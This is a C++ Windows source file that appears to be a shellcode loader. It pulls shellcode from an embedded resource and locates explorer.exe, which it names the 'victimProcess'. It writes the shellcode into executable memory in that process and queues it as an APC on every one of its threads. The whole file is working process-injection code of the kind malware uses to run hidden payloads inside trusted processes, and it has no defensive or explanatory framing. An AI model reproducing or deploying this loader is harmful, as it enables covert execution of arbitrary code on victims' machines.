#include"..\public.hpp"
#include<vector>

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR  lpCmdLine, _In_ int  nCmdShow)
{
	//1.Get shellcode and shellcodesize from Resource by ID
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}
	//2.Get shellcode memory
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (Process32First(snapshot, &processEntry))
	{
		while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0)
		{
			Process32Next(snapshot, &processEntry);
		}
	}
	HANDLE victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//3.Execute shellcode
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	if (Thread32First(snapshot, &threadEntry))
	{
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
			{
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}
	for (DWORD threadId : threadIds)
	{
		HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		Sleep(1000 * 2);
	}
	return 0;
}